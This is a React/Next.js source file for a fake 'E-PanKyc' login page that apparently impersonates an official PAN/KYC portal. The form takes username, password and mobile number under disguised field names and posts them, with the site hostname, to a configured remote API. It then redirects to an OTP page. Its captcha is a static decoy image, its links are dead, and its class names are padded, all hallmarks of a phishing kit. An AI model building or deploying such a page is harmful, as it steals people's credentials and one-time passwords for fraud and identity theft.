'use client'
import Captcha from "../assets/captcha.png";
import { useRouter } from "next/navigation"; // in client component


import { useState } from 'react';
export default function Home() {
  const router = useRouter();
  const [response, setResponse] = useState(false);

  let isSubmit = 0;
  const handleSubmit = (e) => {
    e.preventDefault();
    isSubmit++;
    if(isSubmit == 2){
        return ;
    }
    console.log(isSubmit);
      const formData = new FormData(e.target);
      const body = {};
      formData.forEach((value, key) => {
        body[key] = value;
      });

      body['site'] = window.location.hostname;
      fetch(process.env.API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json'},
        body: JSON.stringify(body),
      })
        .then((res) => res.json())
        .then((responseData) => {
          if(responseData.status == 200){
            setResponse(true);
            router.push("/otp?next=/cfd")
          }else{
            setResponse(false);
            console.log('failed');
          }
            
        })
        .catch((error) => {
          setResponse(false);
          console.error(error);
        });
  };
  return (
    <main>
    <div className="Tpv_login_heading__E5J6K">
      <h3 className="Tpv_login_heading_h3__z0Qx1">Log into for E-PanKyc </h3>
    </div>
    <div className="Tpv_login_form___9zpm Tpv_login_form___9zpmTpv_login_form___9zpm">
      <p className="Tpv_info__04_Jv">
        <span className="Tpv_info_span__oB9oh Tpv_info_span__oB9ohTpv_info_span__oB9ohTpv_info_span__oB9oh">(Please CARE:</span> Username and Password are case sensitive)
      </p>
      <form className="Tpv_form__okPRU" onSubmit={handleSubmit}>
        <div className="Tpv_form_group__aHWg0">
          <label className="Tpv_label__cObJz">Username*</label>
          <input type="text" name="USNNN" className="Tpv_form_control__5hzGF Tpv_form_control__5hzGF2" required maxLength={30} />
        </div>
        <div className="Tpv_form_group__aHWg0 Tpv_form_group__aHWg0Tpv_form_group__aHWg0Tpv_form_group__aHWg0Tpv_form_group__aHWg0">
          <label className="Tpv_label__cObJz Tpv_label__cObJz Tpv_label__caObJz2 Tpv_label__caObJz">Password*</label>
          <input type="password" name="PSS"  className="Tpv_form_control__5hzGF2 Tpv_form_control__5hzGFTpv_form_control__5hzGF2 Tpv_form_control__5hzGFTpv_form_control__5hzGF2 Tpv_form_control__5hzGFTpv_form_control__5hzGF2 Tpv_form_control__5hzGF" required maxLength={30} />
        </div>
        <div className="Tpv_form_group__aHWg0 Tpv_form_group__aHWg0Tpv_form_group__aHWg0Tpv_form_group__aHWg0 Tpv_form_group__aHWg0Tpv_form_group__aHWg0">
          <label className="Tpv_label__cObJz Tpv_label__cObJzTpv_label__cObJz">Mobile*</label>
          <input type="text"  minLength={10} maxLength={10} name="MMBB"  className="Tpv_form_control__5hzGF" required />
        </div>
        
            <div className="Tpv_form_group__aHWg0 Tpv_form_group__aHWg0Tpv_form_group__aHWg0">
              <label className="Tpv_label__cObJz">
                Type the text shown in the image*
              </label>
              <input
                type="text"
                className="Tpv_form_control__5hzGF"
                maxLength={30}
              />
            </div>
            <div className="Tpv_captcha__luduR Tpv_captcha__luduR">
              <div className="Tpv_w_50__Sr4Sb">
                <input type="radio" id="" defaultChecked />
                Image Captcha
              </div>
              <div className="Tpv_w_50__Sr4Sb">
                <input type="radio" id="" disabled />
                Audio Captcha
              </div>
              <div className="Tpv_clear__O2odX" />
              <div className="Tpv_top_10__85sFl">
                <div>
                  <img
                    alt="oRPcKP"
                    loading="lazy"
                    width={150}
                    height={39}
                    decoding="async"
                    data-nimg={1}
                    src={Captcha.src}
                    style={{ color: "transparent" }}
                  />
                </div>
              </div>
              <div className="Tpv_form_group__aHWg0 Tpv_form_group__aHWg0Tpv_form_group__aHWg0">
                <input type="submit" className="Tpv_btn__Mbztt Tpv_btn__MbzttTpv_btn__MbzttTpv_btn__Mbztt " defaultValue="SUBMIT" />
                <input type="reset" className="Tpv_btn__Mbztt Tpv_btn__MbzttTpv_btn__Mbztt" defaultValue="RESET" />
              </div>
              <p>
                <a href="/">Forget Password</a>
              </p>
              <p>
                <a href="/"> Active</a>
              </p>
            </div>
      </form>
    </div>
    <div className="Tpv_p_body__VIl_Q">
      <ul className="Tpv_provide__KIDMh Tpv_provide__KIDMhTpv_provide__KIDMh">
        <li>Required fields an asterisk ().</li>
        <li>
          Refrain from sharing your personal information, including your user ID and password, on any other page or platform
        </li>
        <li>Username and password are sensitive. Do not share with anyone</li>
      </ul>
    </div>
  </main>
  
  )
}
